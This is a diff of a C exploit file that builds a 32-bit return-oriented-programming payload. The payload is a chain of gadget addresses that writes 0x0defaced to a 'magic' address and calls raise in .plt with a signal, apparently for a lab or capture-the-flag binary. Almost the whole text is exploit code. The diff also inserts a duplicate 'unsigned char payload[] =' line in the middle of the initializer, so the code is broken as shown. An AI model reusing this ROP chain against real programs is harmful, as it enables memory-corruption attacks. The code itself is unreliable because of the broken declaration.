@@ -25,6 +25,7 @@
 // Invoke raise in .plt
 
 unsigned char payload[] =
+	unsigned char payload[] =
 	/* ------------------------------------	*/
 	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
@@ -32,19 +33,14 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
+	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
+	"\x08\xb0\x88\x0c"		// Address of magic
 	"\x1e\x90\x04\x08"		// Address of pop ebx gadget (0x0804901e)
-	"\x04\xa0\x88\x0c"		// Address of rnd1
-	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
-	"\x08\xa0\x88\x0c"		// Address of rnd2
-	"\x28\x71\x88\x0c"		// Address of mov [ebx] into ebx (0x0c887128)
-	"\x58\x71\x88\x0c"		// Address of mov [edx] into edx (0x0c887158)
-	"\x68\x71\x88\x0c"		// Address of add edx to ebx (0x0c887168)
-	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
-	"\x0c\xb0\x88\x0c"		// Address of mgk2
+	"\xed\xac\xef\x0d"		// 0x0defaced (in little endian)
 	"\x48\x71\x88\x0c"		// Address of mov ebx to [edx] (0x0c887148)
 	"\x30\x90\x04\x08"		// Address of raise in .plt (0x08049030)
 	"\xef\xbe\xad\xde"		// DEADBEEF (extra return address)
-	"\x0c\x00\x00\x00";		// SIGUSR1
+	"\x0a\x00\x00\x00";		// SIGUSR1
 	/* ------------------------------------	*/
 
 
